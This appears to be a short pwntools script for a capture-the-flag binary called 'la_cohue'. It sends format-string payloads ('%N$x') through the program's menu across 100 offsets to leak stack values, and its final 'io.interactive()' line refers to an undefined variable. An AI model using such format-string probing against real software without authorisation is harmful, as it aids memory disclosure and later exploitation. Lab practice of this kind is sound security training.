#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./la_cohue', checksec=False)

for i in range(100):
	p = process(level='Error')

	p.sendlineafter(b">>> ", b"2", timeout=1)
	p.sendline("%{}$x".format(i).encode())
	p.recvuntil(b': ')
	result = p.recvline().decode()
	if result:
		print(str(i) + ': ' + str(result).strip())
	p.close()
  
io.interactive()



